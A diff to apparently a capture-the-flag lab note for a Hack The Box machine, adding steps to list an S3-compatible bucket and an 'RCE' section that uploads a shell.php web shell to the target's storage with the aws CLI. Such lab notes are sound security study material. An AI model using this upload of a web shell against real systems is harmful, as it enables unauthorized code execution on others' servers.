@@ -2,10 +2,22 @@
 aws configure
 ```
 
+default region = us-east-1
+
 See bucket
 ```
-aws s3 ls --endpoint-url http://facts.htb:54321
+aws s3 ls --endpoint-url=http://facts.htb:54321
 ```
+
+---
+
+# RCE 
+
+If the bucket is called /storage
+```
+aws --endpoint-url=http://facts.htb:54321 s3 cp shell.php s3://storage/shell.php
+```
+
 
 Go into a folder
 ```
